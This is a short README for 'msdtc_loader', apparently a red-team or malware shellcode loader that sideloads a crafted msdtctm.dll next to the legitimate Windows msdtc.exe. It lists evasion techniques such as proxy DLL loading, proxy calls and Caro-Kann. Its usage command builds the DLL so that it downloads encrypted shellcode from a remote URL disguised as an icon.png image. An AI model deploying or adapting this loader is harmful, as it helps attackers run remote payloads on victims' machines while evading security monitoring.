# msdtc_loader

1. dll sideload
2. no crt
3. proxy load dll
4. proxy call
5. Caro-Kann

## usage

```
cd ./msdtc_loader

python3 ./minish4loaderdll.py  -u http://$shellcode_download_url/icon.png -f ~/$shellcode.x64.bin -o $(pwd)/$encrypt_shellcode_output.png -pf $(pwd)/msdtctm.dll
```
Put msdtc.exe (from System32 folder) and msdtctm.dll together


This may be migrated to the sh4loader project in the future

## credits

https://vulnlab.com/

https://maldevacademy.com/

https://github.com/S3cur3Th1sSh1t/Caro-Kann

https://github.com/paranoidninja/Proxy-Function-Calls-For-ETwTI
